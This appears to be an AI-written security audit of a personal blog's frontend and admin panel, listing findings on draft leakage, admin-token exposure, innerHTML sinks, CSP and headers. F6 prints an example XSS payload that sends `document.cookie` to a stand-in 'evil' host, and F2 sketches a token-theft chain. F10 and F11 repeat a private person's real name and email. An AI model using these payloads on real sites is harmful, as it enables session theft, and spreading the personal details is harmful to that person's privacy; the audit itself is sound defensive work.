# Public-frontend security & privacy audit — `blog-enter/` + `p3-menu/`

Audited read-only. Every line number below was verified by reading the file in this session.
Scope: `blog-enter/*.html`, `blog-enter/js/*.js`, `blog-enter/css/*.css`, `blog-enter/admin/*`,
`p3-menu/*`. Server code was read only as context for claims about the published artifact and
the admin panel's safety boundary.

Context that shapes severity: site is served over **plain HTTP from a public IP**, the same
origin is planned to host `/_admin/` and a third-party comment system at `/comments/`
(`deploy/PLAN-COMMENTS-WALINE.md:56,282-328,586`), article bodies are HTML injected via
`innerHTML`, and pages must also work from `file://`.

> Note: `blog-enter/server/*` was being edited by another process *during* this audit
> (mtimes 2026-10-06 11:15–11:16 vs. all frontend files frozen at 2026-10-02). Server-side
> line numbers below reflect the revision I read; re-verify before acting on them.
> All frontend files were stable throughout.

---

## F1 — Draft posts are fully public; `?preview=` is a client-side flag, not a control

* **id**: F1
* **severity**: **blocker** (the moment a draft exists; no drafts exist today)
* **files/lines**:
  * `js/posts.js:16` — `window.POSTS = [` (the entire array, drafts included, is a published asset; loaded by `archive.html:135` and `article.html:146`)
  * `js/article.js:197-200` — `if (post && post.isDraft && preview !== post.slug) { showNotFound(slug); return; }`
  * `js/archive.js:29-39` — `const VISIBLE = () => POSTS().filter((p) => !p.isDraft || p.slug === previewSlug);`
* **problem**: The gate compares the URL parameter against the post's own slug, and the slug is
  inside the same file that is served to the public. Concrete path: `curl /js/posts.js` → find
  `{ slug: "my-draft", isDraft: true }` → open `/article.html?slug=my-draft&preview=my-draft` →
  the full draft body renders. `/archive.html?preview=my-draft` also lists it (`archive.js:128-131`
  even appends `preview=` to draft links). Nothing here is a permission check — the comment at
  `archive.js:22-27` says so explicitly — but the *result* is that "unpublished" content is
  published. Today `js/posts.js` contains 8 posts and **no** `isDraft: true` (`grep isDraft` over
  `js/posts.js` → no match), so this is latent, not currently exploited — and it arms itself the
  first time the documented draft workflow (`admin/index.html:136-138`) is used.
* **requiredFix**: Either (a) stop publishing drafts: make the publish step (`deploy/bin/blog-publish.sh`)
  strip `isDraft: true` entries from `js/posts.js` before rsync, or (b) keep drafts out of
  `window.POSTS` entirely by splitting drafts into a file that is not published. Do not rely on
  `?preview=` in any form for confidentiality.
* **confidence**: **high**

## F2 — Comment system on the same origin as `/_admin/` ⇒ one comment-system XSS steals the admin session

* **id**: F2
* **severity**: **blocker** (in the `/comments/` deployment; medium if that plan is dropped)
* **files/lines**:
  * `admin/admin.js:27` — `let token = typeof window.__ADMIN_TOKEN__ === 'string' ? window.__ADMIN_TOKEN__ : '';`
  * `admin/admin.js:66` — `o.headers['x-admin-token'] = await ensureToken();`
  * `admin/admin.js:29-37` — `ensureToken()` → `fetch('/api/session')` → `token = data.token`
  * `server/dev-server.mjs:518-519` — `const payload = 'window.__ADMIN_TOKEN__ = ' + JSON.stringify(session.token)...` (route `/_admin/token.js`)
  * `admin/admin.js:13,23` — comments still say the token comes from `/_admin/token.js`, but that
    route is **not referenced by any page** (`admin/index.html` loads only `/js/pages.js` and
    `/_admin/admin.js`; the note at `admin/index.html:211-216` says it was removed).
* **problem**: Both the token source and the blog owner's session live on the public origin.
  The threat is not the blog itself but the co-hosted, public-input service: `deploy/PLAN-COMMENTS-WALINE.md`
  proposes `location ^~ /comments/ { proxy_pass http://127.0.0.1:8360; }` and
  `location ^~ /api/ { proxy_pass http://127.0.0.1:8848; }` (`PLAN-COMMENTS-WALINE.md:282,328`)
  and Waline loaded from a CDN (`:364-367`). Any XSS reachable through the comment service (or
  any other same-origin app) runs with the blog's origin and can do:
  `<script src="/_admin/token.js"></script>` → `fetch('/', {method:'POST',body:window.__ADMIN_TOKEN__})`
  → full post write/delete once the owner has unlocked. The un-authenticated GET surface below
  (F3) makes this worse. Note the token route deliberately skips the Origin check
  (`dev-server.mjs:505-506`), so a `<script src>` from a sibling same-origin app is accepted.
  The only thing standing in front of this today is the Host-header allow-list
  (`security.mjs:45-53`, loopback only), i.e. the admin is *not actually reachable* through the
  public origin yet — which is exactly why the fix must be a design rule, not an accident.
* **requiredFix**: Never co-host the admin API/session with any public-input service. If remote
  admin is needed, put `/_admin/` + its API on a separate hostname (or mTLS/IP-allow-listed
  vhost, as `PLAN-ADMIN-REMOTE.md:346-378` suggests), and delete the `/_admin/token.js` route
  outright (removing `admin/admin.js:27` with it), so a token can only ever be obtained by an
  authenticated fetch, never by `<script src>`.
* **confidence**: **high** (design-level; exact reachability depends on the nginx config actually deployed)

## F3 — Unauthenticated `GET /api/*` exposes every draft body, backups and git log

* **id**: F3
* **severity**: **high** (whenever `/api/` is proxied to the public origin; none if never proxied)
* **files/lines**:
  * `server/dev-server.mjs:339-342` — `on('GET', '/api/posts', async () => { ... return { posts: listClean(parsed) }; })` — no `unlocked`/token check
  * `server/dev-server.mjs:352-358` — `on('GET', '/api/posts/one', ...)` — returns `store.clean(post)` for any slug
  * `server/dev-server.mjs:619-633` — only `req.method !== 'GET'` is gated ("只有非 GET 才检查解锁与令牌")
  * `server/lib/posts-store.mjs:479-492` — `clean()` keeps `body` and `isDraft`
* **problem**: Reading `GET /api/posts` returns the **complete body of every post including
  drafts**, plus `/api/backups` (names of every historical `posts.js`), `/api/images` and
  `/api/git` (commit log). `deploy/PLAN-ADMIN-REMOTE.md:172-180` documents this against an
  earlier revision and it is still true in the revision I read. With no passphrase set
  (`dev-server.mjs:141` `let unlocked = !(await auth.hasPassphrase(...))`), `GET /api/session`
  also returns `token: session.token` (`:305`), so an unauthenticated visitor also receives the
  CSRF token. Concrete: anyone who can reach the origin and pass the Host check gets every
  unpublished draft verbatim.
* **requiredFix**: Gate **all** `/api/*` (including GET) behind the unlock state; require the
  token for any response that contains a draft or a filesystem name; return `token` only to the
  request that proves it is already unlocked.
* **confidence**: **high** (code as read; reachability depends on the nginx vhost)

## F4 — No CSP is possible on the public pages without `'unsafe-inline'` for **both** scripts and styles

* **id**: F4
* **severity**: **high** (this is the only automated mitigation left for F1/F2/F3 and stored XSS)
* **files/lines** (all verified):
  * inline `<style>` written at runtime: `admin/admin.js:176-183` (`doc.write('...<style>' + css + '</style>...')`) — admin only
  * inline `<script>`: `404.html:79-88`
  * inline `style="..."` attributes: `archive.html:116` and `archive.html:121`
  * runtime inline styles (`el.style.setProperty`, which CSP treats as inline style):
    `js/menu.js:29,143,180-185,193,205,224` (fan radius/angle/`--spread`/`--font-scale`),
    `js/dock.js:42,172-173,187-188` (clock hands, tilt), `js/water.js:508,552-557,589`
    (bubbles, flash, `--fall`), `js/boot.js:65`, `js/character.js:57`,
    `js/article.js:95,223`, `js/pages.js:198` (`this.el.innerHTML = html` → toast), `js/boot.js:102-103`
    (`keys.innerHTML = ...`), `js/menu.js:42-44` (`a.innerHTML = ...`), `js/archive.js:311`
    (`count.innerHTML = ...`)
  * `deploy/nginx/blog.conf:43` — "CSP 故意不加：站点有内联样式与运行时注入的 DOM，直接上 CSP 会白屏"
* **problem**: A strict `script-src`/`style-src` breaks the fan menu geometry, the water
  animation, the clock hands, the toast, and the article page's margins. So the owner cannot
  retrofit a meaningful CSP without first removing the inline styles — which means a stored XSS
  (F5/F6) has zero mitigation today. Also note the only existing CSP
  (`server/lib/security.mjs:102-114`, `frame-ancestors 'none'`, `default-src 'none'`) is applied
  **only** to the four `ADMIN_ASSETS` paths (`dev-server.mjs:530-538`) — it does not cover the
  public pages and would be bypassed if nginx served the admin UI as static files.
* **requiredFix**: Move all per-element styling to CSS custom properties set via a
  `CSSStyleSheet`/class strategy, replace the three `innerHTML` string builds with
  `textContent`/`createElement`, change `archive.html:116,121` to classes, and move
  `404.html:79-88` into a `.js` file. Then deploy
  `script-src 'self'; style-src 'self'; object-src 'none'; base-uri 'none'; frame-ancestors 'none'`.
* **confidence**: **high**

## F5 — Article body, title and category reach `innerHTML` unescaped; `postMessage`-free but "owner-trusted" is the only defence

* **id**: F5
* **severity**: **high**
* **files/lines**:
  * `js/article.js:214` — `if (body) body.innerHTML = post.body || '<p>这篇还没有正文。</p>';`
  * `js/articles.js` — n/a
  * `js/archive.js:311-313` — `count.innerHTML = active ? '命中 <b>' + posts.length + '</b> / ' + total() + ' 篇 · ' + bits.join(' · ') : ...` where
    `bits.push('分类「' + State.cat + '」')` / `bits.push('标签 ' + State.tags.map(...))`
  * `js/pages.js:123,131` — `$$('.prose pre > code, ...').forEach(...)` → `code.innerHTML = highlight(code.textContent...)`
  * `server/lib/validate.mjs:42-46` — `ALLOWED_TAGS` list filter, **no HTML escaping**
  * `server/lib/validate.mjs:110-112` — `category` is only trimmed and length-capped; `<`/`>` pass through
* **problem**: `post.body` (and `post.category`, which `archive.js:311` concatenates straight into
  `innerHTML`) are injected as raw HTML. I traced every path that reaches these sinks: article
  bodies, titles and categories come from `js/posts.js`, i.e. either the owner's editor or the
  admin API. They are **not** attacker-controllable from a URL — `?slug=`, `?preview=` and
  `/archive.html?cat=…&tag=…` are all validated against real post values before use
  (`archive.js:88-95`, `article.js:189-194`) and everything else goes through `textContent`
  (`article.js:82-88,121,131,134`; `archive.js:154-162,218-219`). But the mitigation is a server
  regex whitelist (`validate.mjs:181-273`), and `validate.mjs` runs **only on save** — the
  renderer applies no escaping at all. The body is explicitly documented as an HTML fragment
  (`article.html:77`, `posts.js:14`), and `post.category`/`post.title` are never escaped
  anywhere (`article.js:117,131,134`; `archive.js:154,160,218`). So: the moment any post body or
  category arrives from a source other than the owner (imported content, a future multi-author
  flow, a compromised admin session — see F2/F3), the injected HTML is executed for every
  visitor forever, in a document that also ships the comment widget.
* **requiredFix**: Escape by default. Render `post.title`, `post.category`, `post.tags` and
  `post.excerpt` via `textContent` (they already are in the list/card renderers — make
  `archive.js:311` use `createElement`/`textContent` too), and for the body keep an explicit
  sanitizer at render time (`article.js:214`) rather than trusting the save-time check. Treat
  `js/posts.js` as untrusted input on every load.
* **confidence**: **high** for the mechanism; **high** that today's data is owner-authored only

## F6 — `/archive.html?cat=<img src=x onerror=…>` is one `innerHTML` away from URL-driven XSS

* **id**: F6
* **severity**: **medium** (currently *not* exploitable — the value is validated)
* **files/lines**:
  * `js/archive.js:88-95` — `State.cat = cat && VISIBLE().some((p) => p.category === cat) ? cat : ALL;`
    and `State.tags = q.getAll('tag').filter((t) => VISIBLE().some((p) => (p.tags||[]).indexOf(t) >= 0));`
  * `js/archive.js:309-313` — the values are then concatenated into `count.innerHTML`
* **problem**: This is the one place where a **URL parameter** reaches an HTML sink. It is safe
  *today purely because* the two guard expressions at `:92-93` reject anything that is not an
  existing category/tag. The guard is easy to lose (e.g. someone drops it while "simplifying
  filters", or changes `readUrl()` to persist raw state) and the sink would then execute
  arbitrary markup from a link — `archive.html?cat=<img src=x onerror=fetch('//evil/?'+document.cookie)>`.
  I am reporting it as a brittle construction rather than a live bug, and I am *not* claiming an
  exploit that I could not demonstrate.
* **requiredFix**: Replace the string build with nodes: create a `<span>`/`<b>` and set
  `.textContent` for the count and each `bits` entry.
* **confidence**: **high** that it is currently safe; **high** that it is a latent sink

## F7 — `menu.js` and `boot.js` build HTML by string concatenation from `window.SITE`

* **id**: F7
* **severity**: **medium**
* **files/lines**:
  * `js/menu.js:42-44` — `a.innerHTML = '<span class="fi-jp">' + label + '</span>' + '<span class="fi-en" aria-hidden="true">' + item.en + '</span>';` with `label = item.label || item.jp || ''` (`:33`) from `window.SITE.menu`
  * `js/boot.js:102-103` — `keys.innerHTML = cfg.hints.map((h) => '<span class="ck"><b>' + h.key + '</b>' + h.text + '</span>').join('');`
  * `js/pages.js:191-202` — `Toast.show(html, ms)` → `this.el.innerHTML = html`, called at `:211` with `'「' + (el.dataset.todo || '待定') + '」…'`
  * sources: `js/data.js:14-17` (`hints`), `js/data.js:26-30` (`menu`), `data-todo` attributes in `about.html:40`, `archive.html:31`, `article.html:35`, `404.html:33`
* **problem**: These are self-XSS-only today — `window.SITE` is a static literal and `data-todo` is
  author-written markup. But `js/data.js` is advertised as the one edit point for the whole site
  (`data.js:1-3`), so any future non-literal menu/hint text (a JSON import, a translated string
  from a file, a CMS) becomes markup. This is the same class of defect as F6 and it is the reason
  a `script-src 'self'` CSP cannot be tightened without touching these three call sites.
* **requiredFix**: Build the three fragments with `createElement` + `textContent`
  (`pages.js:198` should take a node or be renamed to make the HTML contract obvious).
* **confidence**: **high**

## F8 — Admin preview launcher: hand-rolled blocklist sanitizer + `document.write` + no `sandbox` in CSP

* **id**: F8
* **severity**: **medium**
* **files/lines**:
  * `admin/admin.js:122-140` — `FORBIDDEN = 'script,iframe,object,embed,form,input,button,select,textarea,link,meta,base,style,svg,math'`; attribute loop removes `on*`, `srcdoc`, `style`, and `href|src|xlink:href` matching `/^\s*(?:javascript|vbscript|data)\s*:/i`
  * `admin/admin.js:175-184` — `doc.open(); doc.write('<!doctype html>…<style>' + css + '</style>…' + body + '…'); doc.close();`
  * `admin/index.html:168-171` — `<iframe id="preview" title="正文预览" sandbox src="about:blank" loading="lazy">`
  * `admin/admin.js:157-160` — `const frame = $('#preview'); const doc = frame.contentDocument; if (!doc) return;`
  * `server/lib/security.mjs:102-114` — `ADMIN_CSP` has `style-src 'self' 'unsafe-inline'` and **no `sandbox` directive**
* **problem**: Two issues. (1) The sanitizer is a blocklist — `srcset`, `poster`, `data`, and
  other URL-bearing attributes are not filtered, and the `data:` check allows `data:image/…`
  through by omission. That is contained by the iframe's `sandbox` (no `allow-scripts`), so no
  script executes; but because the CSP lacks `sandbox`, the preview document *can* still issue
  network requests (beacons, remote fonts/images), which is a poor property for a preview surface
  that renders content that may come from an untrusted source. (2) `doc.write` builds a whole
  document from `State.current.body` and from CSS fetched at runtime — this is exactly the code
  that forces `style-src 'unsafe-inline'` (F4), and `frame.contentDocument` is read without
  waiting for a load event, so a null/absent document silently skips the preview (the
  `verify-admin-ui.mjs:233-247` CDP check does exercise it, so it works in the Chromium it was
  tested against, but the null path is indistinguishable from success at runtime).
* **requiredFix**: Add `sandbox` to `ADMIN_CSP` and extend the preview sanitizer to allow-list
  attributes instead of blocking them (`src`/`href` only with `https?:` or site-relative values;
  drop `srcset`). Keep the iframe sandbox as the real control.
* **confidence**: **high** for the code paths; **medium** that a practical exploit exists today (the iframe has no `allow-scripts`)

## F9 — Deployment headers: framing and MIME policy are configured twice, inconsistently, and disappear in the proxied admin case

* **id**: F9
* **severity**: **medium**
* **files/lines**:
  * `deploy/nginx/blog.conf:39-41` — `add_header X-Content-Type-Options nosniff;` / `X-Frame-Options SAMEORIGIN;` / `Referrer-Policy strict-origin-when-cross-origin;`
  * `deploy/bt/nginx-locations.conf:40-42` — same three, but this snippet is included *inside* the server block, and each proxy location that adds its own header destroys them (`deploy/PLAN-ADMIN-REMOTE.md:319-323`, `deploy/PLAN-COMMENTS-WALINE.md:294-296`)
  * `server/lib/security.mjs:118-121` — Node serves `nosniff` + `referrer-policy: no-referrer`, **no** `X-Frame-Options`
  * `blog-enter/404.html:10` — `<base href="/">` (needed for the nginx internal-rewrite 404; noted in `deploy/nginx/blog.conf:95-98`)
* **problem**: (a) With `X-Frame-Options: SAMEORIGIN`, any page on the origin may frame any other
  page on the origin — and the admin is designed to appear on that same origin. If the admin is
  proxied, its own `frame-ancestors 'none'` (from Node) is the only framing control and it is one
  nginx misconfiguration away (the plans themselves warn that `add_header` in the proxy location
  wipes the server-level trio). A public page framing `/_admin/` is a clickjacking surface on the
  writing tool, and on the plain-HTTP origin an injected frame is trivially achievable.
  (b) The two deployment paths disagree on which headers actually ship, so "we set nosniff" is
  not verifiable from the repo. (c) On a plain-HTTP public site, `Referrer-Policy` cannot be
  relied on to protect anything for the admin path if the admin shares the origin.
* **requiredFix**: Put `X-Frame-Options: DENY` (or `frame-ancestors 'none'`) on every admin path
  at the nginx layer as well as in Node, re-declare the full header set inside each proxied
  `location`, and make admin access impossible from the public origin (separate vhost / allow-list).
* **confidence**: **high** for the header mechanics; **medium** for the exact live nginx state (not in this repo)

## F10 — `about.html` publishes a real name, a real personal email address and a real GitHub account

* **id**: F10
* **severity**: **medium**
* **files/lines**:
  * `about.html:117` — `<strong>傅圣皓</strong>` (real full name, while `data.js:42` and the rest of the site use the handle `SIMON`)
  * `about.html:192,199` — `mailto:hhh68682011@outlook.com` / `<span class="contact-value">hhh68682011@outlook.com</span>`
  * `about.html:204,211` — `https://github.com/SimonFu2011` / `github.com/SimonFu2011`
  * `about.html:216,223` — `https://x.com/yourname` / `@yourname` — still an untouched template placeholder
  * `about.html:128-130` — `现居 / 远程`, `可接合作与约稿`, `最近更新 2025`
  * `about.html:137` — `<img src="img/kaierxi_touxiang.jpg" … alt="头像占位图（非真实照片）">` — a real portrait JPG whose `alt` still says "placeholder, not a real photo"
* **problem**: The artifact is published to a public IP over plain HTTP. A real name + a working
  personal email + a real GitHub identity is a complete doxxing/harvesting target, and the email
  is a live spam/phishing address (it appears twice, so both the visible text and the link).
  The comment at `about.html:180-181` ("下面的邮箱与用户名是占位值") is no longer true, which is
  how the real email survived review. Separately, the `alt` text on a real photo is wrong
  (accessibility + it tells visitors the photo is fake).
* **requiredFix**: Decide deliberately: if the identity is meant to be public, drop the "placeholder"
  comment and fix the `alt`; if not, replace the address with an obfuscated/relay form (or a
  contact form), remove the full name or use the handle, and remove/complete the `@yourname` entry.
* **confidence**: **high**

## F11 — Malformed HTML on the contact card (`href="mailto:…` is missing its closing quote)

* **id**: F11
* **severity**: **low**
* **file and line**: `about.html:192`
* **quoted code**:
  ```html
  <a class="contact" href="mailto:hhh68682011@outlook.com>
  ```
  (the attribute never closes; the next `"` is the opening quote of `class="contact"` at
  `about.html:204` — i.e. `rel="noopener noreferrer"` on line 204 ends up inside the `href`
  value, and everything between the two lines becomes attribute soup)
* **problem**: The email `href` is malformed, so the first contact card is not a valid mail link
  and the markup for lines 192-202 is swallowed into an attribute. No script execution (there is
  no user input anywhere near it), but it is a real defect that any HTML validation would catch,
  and it means the "real email" in F10 is also broken as a link — the worst of both worlds.
* **requiredFix**: Close the quote: `href="mailto:hhh68682011@outlook.com"` (and run the file
  through a validator; `about.html` is the only malformed document in the set).
* **confidence**: **high**

## F12 — `file://` vs `http://`: one behavioral difference with a security consequence

* **id**: F12
* **severity**: **low**
* **files/lines**:
  * `404.html:10` — `<base href="/">`
  * `js/article.js:24-39` — custom `query()` parser, because "file:// 下 URLSearchParams 读不到 location.search（部分浏览器会抛）"
  * `js/article.js:205-209` — `replaceState` guarded in `try/catch` for `file://`
  * `js/archive.js:106-110` — same guard
* **problem**: The site deliberately makes the two protocols behave the same, which is why the
  custom parser exists. The one place they differ *and it matters* is the base URL for the 404
  document: `<base href="/">` resolves to the filesystem root under `file://`, so from disk the
  404 page's `css/pages.css` and all its navigation links point outside the project (unstyled /
  dead), whereas over HTTP the base is the site root and it works. That is a functional
  difference, and the security-relevant part is the inverse: the `<base href="/">` is exactly the
  primitive an attacker would want if markup could ever be injected into `404.html`, because it
  retargets every relative URL on the page. Since `404.html` reflects `location.pathname +
  search + hash` (`404.html:85`) — into `textContent` at `:86`, which is correct — there is no
  live exploit. I am listing it because `base` is on the "never allow in the body" list
  (`validate.mjs:51`) and the page that ships it is the one that echoes the URL.
* **requiredFix**: Keep the reflection as `textContent` (done). If a strict CSP is added
  (F4), include `base-uri 'none'` on the 404 page or drop the `<base>` and emit absolute asset
  paths instead.
* **confidence**: **high**

## F13 — `p3-menu` is clean, with one latent `innerHTML` pattern

* **id**: F13
* **severity**: **low**
* **files/lines**:
  * `p3-menu/js/game.js:416-422` (`btn.innerHTML = … p.jp, p.en, p.lv`), `:458-465`, `:468-473`, `:476-482`
  * `p3-menu/js/game.js:302-303,319,414` — all `dataset` reads are `Number(...)` of local `data-*` markup
* **problem**: Every value concatenated at those four sites comes from the file's own `PERSONAS`
  / `STAT_KEYS` / `AFF_KEYS` constants. I checked the page's inputs and there are **no** URL
  parameters, no `fetch`, no storage and no external resources (`p3-menu/index.html:7,351` are
  the only `<link>`/`<script>`), so there is no attacker-controllable path. It is the same
  CSP-relevant pattern as F7 (inline styles via `style="--pct:…"` at `:462,477`) and would need
  the same treatment before any CSP could be applied to this demo.
* **requiredFix**: If this demo is ever hosted, convert the four `innerHTML` builds to element
  construction; otherwise no action needed.
* **confidence**: **high**

---

## Checked and found sound

**XSS / injection — every sink in scope, with its data source**

* `innerHTML` inventory is complete: `admin/admin.js:139` (returns the sanitized preview body,
  consumed only by the script-dead sandboxed iframe), `admin/admin.js:168` (re-runs the site's
  escaping highlighter), `admin/admin.js:170`, `js/archive.js:311` (F6), `js/article.js:214` (F5),
  `js/boot.js:102` (F7), `js/menu.js:42` (F7), `js/pages.js:131` and `:198` (F7), `js/water.js:579`
  (`innerHTML = ''`, a clear), `js/posts.js:91` (article *text* that documents `innerHTML`, not code).
* `eval`, `new Function`, `setTimeout(string)`, `setInterval(string)`, `document.write` on public
  pages, `insertAdjacentHTML`, `outerHTML`, `createContextualFragment`, `srcdoc`: **none** in
  `blog-enter/js/*` or `blog-enter/*.html`. The only `document.write` is the admin preview
  (`admin/admin.js:176`), reached only from `admin/index.html:171`.
* `js/pages.js:98-101,113-119,131` — the code highlighter escapes `&`, `<`, `>` **before** the
  token regex runs, and the regex replacement only emits `<span class="tok-…">` wrappers around
  already-escaped text, so `innerHTML = highlight(code.textContent)` cannot be broken out of.
  This is the one place in the codebase that does it right.
* `js/article.js:24-39` — the hand-written query parser cannot throw on garbage input (decode is
  wrapped in `try/catch`) and the value is used only for `find()` comparisons and, in the
  not-found path, `textContent` (`:82-88`).
* `js/article.js:110,117` — `document.title = post.title + …` and
  `desc.setAttribute('content', post.excerpt)`; titles here are from `posts.js`, never the URL.
* `js/archive.js:123-131,148,216` — hrefs built with `encodeURIComponent`; the only place a raw
  value is interpolated into a URL is `archive.js:107` `replaceState('?' + s)` where `s` comes
  from `URLSearchParams.toString()`.
* `404.html:85-86` — the reflected `pathname + search + hash` goes through `textContent`.
* `js/data.js` — no `live2d.adapter`, no `music.src`, no external asset referenced; the Live2D
  hook (`js/character.js:31-47`) does nothing unless a `model` is configured, and it loads
  whatever `cfg.model` points at (documented as an owner decision at `data.js:72-85`).
* `js/dock.js:406-411,415-421,513-519` — images/audio come from the same static `SITE.music`
  config, and the drag-and-drop path (`:487-535`) only ever creates an object URL from a local
  `File` (`URL.createObjectURL`), which cannot be attacker-supplied by a link.
* `js/dock.js:241-249` — a global `drop` handler calls `preventDefault()` on every drop
  (deliberately, per the comment) but only acts when the file was dragged over the record.

**DOM / URL / framing / messaging**

* `target="_blank"`: exactly two (`about.html:204,216`), both with `rel="noopener noreferrer"`. No
  other `target` attribute anywhere in the two projects. ✅
* `postMessage` / `addEventListener('message')` / `window.open` / `document.referrer` reads /
  `window.opener`: **none** in scope. ✅
* `iframe`: one, `admin/index.html:171`, `sandbox` with no `allow-scripts` and no
  `allow-same-origin` — the note at `:168-170` correctly explains why both together would be no
  sandbox at all, and the preview CSS is fetched and inlined instead of `<link>`ed. ✅
* No third-party embeds, no `<object>`/`<embed>`, no service worker, no manifest. ✅

**External network requests — complete list**

* HTML/CSS/JS in both projects reference **zero** external hosts. The only absolute URLs are in
  prose/links: `about.html:204,216` (`github.com/SimonFu2011`, `x.com/yourname`), and the
  `xmlns`/`url(#…)` SVG-internal references in `index.html`, `p3-menu/index.html` and
  `img/avatar.svg`. The one `url(...)` value in CSS is an inline
  `data:image/svg+xml,…` (`css/style.css:363`). No `@import`, no webfont, no CDN, no analytics,
  no tracking pixel. ✅ For a plain-HTTP public site this is the best possible answer: there is
  no SRI problem to solve because there are no subresources to integrity-check.
* `deploy/PLAN-COMMENTS-WALINE.md:364-367` proposes a waline CSS+JS **from `unpkg.com` over
  plain HTTP**, which would be the first third-party dependency; that is a recommendation in a
  plan document, not something shipped in the audited files.

**Storage / cookies on public pages**

* `localStorage`, `sessionStorage`, `document.cookie`, `indexedDB`: **zero** occurrences in
  `blog-enter/js/*`, `blog-enter/*.html`, `p3-menu/*`. The only matches are prose comments in
  `admin/admin.js:13,802` stating that the token is *not* put there. ✅
* The admin token flow is memory-only: `admin/admin.js:27,29-37,66,74,803` — a `let` in a
  closure, sent as an `x-admin-token` header, deliberately never written to storage or the URL,
  and cleared on 401/403 (`:74`). ✅ (The residual risk is F2, not the storage decision.)

**Information disclosure in the published artifact**

* The publish step excludes what must not ship: `deploy/bin/blog-publish.sh:60-69` excludes
  `/server/`, `/admin/`, `/tests/`, `.admin/`, `.git*`, and uses `-s *.md` so `ADMIN.md` cannot
  linger (`:54-58` documents the exact bug that used to leave it readable).
* `grep` over `js/posts.js` for `token|password|secret|127.0.0.1|localhost|C:\|/srv/|43.108`:
  no hits (the only `@` hits are the CSS `@property`/`@media` at-rules inside code samples). ✅
* No commented-out credentials, no dev-only hostnames, no internal filesystem paths in the
  published JS/HTML/CSS. The one internal path I found is a comment (`js/dock.js:6` referencing
  `.preview/handpath.py`), and `.preview/` is gitignored (`D:\DS\.gitignore`).
* `grep isDraft` over the entire `blog-enter` tree: no draft exists in `js/posts.js` today (8
  posts, all live). F1 is about the mechanism, and I am not claiming a live leak.
* The admin page's own UI (`admin/index.html`) is not in the published set; if it ever is copied
  in, it leaks the writing tool's shape and the `/api/*` route names (F3/F9) but **not** the
  token — the token is fetched at runtime, and `admin/index.html:211-216` deliberately avoids
  injecting it via a `<script>` tag.
* Client-side bypass of the admin gate is not possible: the gate only controls visibility
  (`admin/admin.js:804-805,837-838`); every write needs the header token and every authenticated
  read needs the server's `unlocked` state, so un-hiding `#app` in devtools yields an empty UI.

**Framing / clickjacking specifics**

* The admin response carries `frame-ancestors 'none'` in `ADMIN_CSP`
  (`server/lib/security.mjs:112`, applied at `server/dev-server.mjs:530-538`) **and** is served
  from a whitelist of four filenames (`dev-server.mjs:73-78,530`), so no directory listing and no
  arbitrary admin-file fetch. The public pages carry `X-Frame-Options: SAMEORIGIN`
  (`deploy/nginx/blog.conf:40`) — see F9 for why SAMEORIGIN is the wrong value once the admin can
  share the origin.
* `/admin/`, `/_admin/`, `/server/`, `.admin/`, `.git/` are all `return 404` at nginx
  (`deploy/nginx/blog.conf:51-59`, `deploy/bt/nginx-locations.conf:18-24`) with an explicit
  second-line-of-defence comment about the underscore variant.

**Other**

* `p3-menu`: single stylesheet + single script, both relative (`index.html:7,351`), no network,
  no storage, no URL inputs — a self-contained visual demo with no attack surface.
* No `document.write`, `postMessage`, cookie or external request was found in any public page
  that I did not list above.

---

## Priority order

1. **F1** — stop publishing drafts (or accept that "draft" means "published").
2. **F2 + F3** — never put `/_admin/`, `/api/` and a public-input comment service on one origin;
   gate all `/api/*` GETs; delete `/_admin/token.js`.
3. **F4 + F6 + F7** — remove the inline-style/`innerHTML` constructions so a real CSP becomes
   possible; it is the only defence that survives F5.
4. **F5** — escape title/category/excerpt at render time and stop treating `js/posts.js` as trusted.
5. **F9 + F10 + F11 + F8 + F12 + F13** — headers/framing, PII and the malformed mailto, preview
   sanitizer hardening, and the `404.html` base-uri note.
